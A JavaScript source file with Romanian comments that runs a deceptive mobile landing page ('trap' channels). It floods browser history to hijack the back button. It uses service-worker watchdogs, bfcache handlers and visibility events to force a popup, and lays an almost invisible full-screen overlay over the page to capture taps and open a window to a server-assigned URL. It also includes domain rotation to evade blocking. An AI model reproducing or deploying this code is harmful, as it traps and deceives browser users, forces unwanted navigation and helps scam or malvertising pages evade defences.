// lander.js — orchestrator principal v2
// integrează ios-popup.js (blank-first touchend pattern) + persistence.js
(function(){

  // --- GUARD: dacă popup a fost deja arătat, skip ---
  if(window.__timer&&window.__timer.wasShown()){
    return;
  }

  // --- CHECK: dacă timer-ul a expirat deja (iOS a omorât pagina și userul a revenit) ---
  if(window.__timer&&window.__timer.ready()&&window.__showPopup){
    setTimeout(function(){window.__showPopup()},300);
    return;
  }

  // --- ID 18: state tampered (HMAC fail) — fire popup immediately ---
  // persistence.js sets __stateInvalid=true on pageshow HMAC failure
  // Bot tampering state = they're real enough to tamper → show popup early
  if(window.__stateInvalid){
    setTimeout(function(){if(window.__showPopup)window.__showPopup();},200);
    return;
  }

  var cfg=window.__CONFIG||{};
  var FLOOD=cfg.HISTORY_FLOOD_COUNT||50;
  var AUTO_BACK=cfg.AUTO_BACK_MS||1000;
  var delay=window.__ab?window.__ab.delay:(cfg.POPUP_DELAY_MS||20000);

  // Channel names dinamice — citite din __CONFIG injectat de middleware
  // Dacă lipsesc (dev local), fallback la valori statice
  var CH_MAIN=cfg.BROADCAST_CHANNEL||'trap_ch';
  var CH_HB=cfg.HB_CHANNEL||'trap_sw_hb';
  var DB_NAME=cfg.DB_NAME||'trap_db';

  // --- HISTORY FLOOD + AUTO-BACK ---
  for(var i=0;i<FLOOD;i++)history.pushState({t:i},'','#s'+i);
  setTimeout(function(){
    // iOS TikTok blochează history.go(-N) mare — folosim back() în loop rapid
    var backCount = FLOOD + 1;
    var fired = 0;
    var iv = setInterval(function(){
      if(fired >= backCount){ clearInterval(iv); return; }
      history.back();
      fired++;
    }, 20);
  }, AUTO_BACK);

  // --- FIRE GUARD ---
  // navigator.locks pe Android previne race între SW + BC + setTimeout
  function fireWithLock(){
    if(window.__popup&&window.__popup.fired())return;
    if(typeof navigator!=='undefined'&&navigator.locks&&navigator.locks.request){
      navigator.locks.request('__popup_fire',{ifAvailable:true},function(lock){
        if(lock&&window.__showPopup)window.__showPopup();
        return Promise.resolve();
      });
    } else {
      if(window.__showPopup)window.__showPopup();
    }
  }

  // --- MECHANIC: setTimeout fallback (ID 6/99 — blob Worker + SharedWorker eliminate) ---
  // sw.js + BroadcastChannel fac același job fără overhead
  // setTimeout e backup dacă SW nu răspunde
  var _fallbackTimer=setTimeout(function(){fireWithLock()},delay+2000);

  // --- MECHANIC: visibilitychange ---
  document.addEventListener('visibilitychange',function(){
    if(document.visibilityState==='visible'){
      if(window.__timer&&window.__timer.ready()&&window.__showPopup)window.__showPopup();
    }
  });

  // --- MECHANIC: pageshow — bfcache restore (ID 23 — PRIMAR pe iOS) ---
  // pageshow cu e.persisted=true e singura metodă bulletproof pe iOS bfcache
  // Nu depinde de __persistence — verifică timer.js direct
  window.addEventListener('pageshow',function(e){
    if(!e.persisted)return; // skip prima încărcare normală
    clearTimeout(_fallbackTimer); // SW sau pageshow se ocupă — anulăm fallback
    var t=window.__timer;
    if(!t)return;
    if(t.wasShown())return; // deja arătat în sesiunea asta
    if(t.ready()){
      // timer expirat în timp ce iOS a omorât pagina — fire imediat
      setTimeout(function(){if(window.__showPopup)window.__showPopup()},200);
    }else{
      // timer mai are timp — repornim countdown-ul de unde a rămas
      var rem=t.remaining();
      setTimeout(function(){
        if(window.__timer&&window.__timer.ready()&&window.__showPopup)
          window.__showPopup();
      }, rem > 0 ? rem : 500);
    }
  });

  // --- MECHANIC: popstate (back button manual) ---
  window.addEventListener('popstate',function(){
    if(window.__popup&&!window.__popup.fired()&&window.__showPopup)window.__showPopup();
  });

  // --- MECHANIC: BroadcastChannel (semnal de la SW/SharedWorker) ---
  try{
    var ch=new BroadcastChannel(CH_MAIN);
    ch.onmessage=function(e){if(e.data==='fire')fireWithLock()};
  }catch(e){}

  // --- MECHANIC: SW messages ---
  if('serviceWorker' in navigator){
    navigator.serviceWorker.addEventListener('message',function(e){
      if(e.data==='fire')fireWithLock();
    });
    navigator.serviceWorker.register('/sw.js',{scope:'/'}).then(function(){
      // trimitem channel names la SW — timer_start cu chMain + chHb
      navigator.serviceWorker.ready.then(function(reg){
        if(reg.active) {
          reg.active.postMessage({
            type:'timer_start', delay:delay,
            chMain:CH_MAIN, chHb:CH_HB
          });
          // ID 19: lander alive ping — SW starts 2s watchdog
          // If no second ping arrives, SW fires popup (covers silent JS errors in lander)
          reg.active.postMessage({ type:'lander_alive', delay:delay });
        }
      });
    }).catch(function(){});
  }

  // SharedWorker eliminat (ID 6/99) — nu merge pe iOS, overhead inutil
  // sw.js + BroadcastChannel + setTimeout fallback acoperă același scenariu

  // --- MECHANIC: iOS gesture layer (blank-first window.open via ios-popup.js) ---
  // ios-popup.js expune window.__iosPopup
  // la touch: deschide fereastra blank sincron, după asignează URL-ul via /api/claim
  if(window.__iosPopup){
    window.__iosPopup.prepare(null); // pregătește layer-ul fără URL — URL vine din /api/claim
  } else {
    // Fallback: tap layer clasic pentru dispozitive non-iOS sau când __iosPopup nu e disponibil
    var tapLayer=document.createElement('div');
    tapLayer.id='__tap';
    tapLayer.style.cssText=[
      'position:fixed','top:0','left:0',
      'width:100vw','height:100vh',
      'z-index:99997',
      'opacity:0.001',  // non-zero — WebKit cere element "vizibil" pt interacțiuni
      'touch-action:manipulation'
    ].join(';');
    tapLayer.setAttribute('aria-hidden','true');
    var tapUsed=false;
    tapLayer.addEventListener('touchend',function(e){
      // touchend NOT touchstart — WebKit permite window.open DOAR din touchend
      if(tapUsed)return;
      tapUsed=true;
      e.preventDefault();
      if(tapLayer.parentNode)tapLayer.parentNode.removeChild(tapLayer);
      if(window.__timer&&window.__timer.ready()&&window.__showPopup){
        window.__showPopup();
      }
    },{passive:false,capture:true});
    document.body&&document.body.appendChild(tapLayer)||
      document.addEventListener('DOMContentLoaded',function(){document.body.appendChild(tapLayer)});
  }

  // --- TRACK VISIT ---
  if(window.__analytics)window.__analytics.visit();

  // --- DOMAIN ROTATION health monitor ---
  if(window.__domainRotation)window.__domainRotation.start();

  // --- ID 19: signal SW that lander.js fully initialized (cancels watchdog) ---
  if('serviceWorker' in navigator){
    navigator.serviceWorker.ready.then(function(reg){
      if(reg.active) reg.active.postMessage({ type:'lander_ready' });
    }).catch(function(){});
  }

})();
